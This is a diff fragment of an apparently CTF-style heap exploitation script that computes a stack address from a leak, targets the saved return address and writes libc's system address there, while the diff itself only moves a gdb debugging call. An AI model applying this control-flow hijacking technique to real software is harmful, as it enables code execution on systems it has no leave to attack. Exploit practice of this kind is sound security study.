@@ -115,6 +115,7 @@ base_stack = leak-0x205c8
 log.info(f"stack: {hex(base_stack)}")
 saved_rip = base_stack+0x204a8
 # write to saved rip
+gdbs()
 delete(9)
 write64(-69,heap+0x480,saved_rip)
 add(0)
@@ -128,7 +129,6 @@ write64(-69,heap+0x480,saved_rip+0x10)
 add(0)
 write_addr(-69,libc.sym.system)
 delete(9)
-gdbs()
 add(0)
 #
 # # ploting to fake chunks size 1 
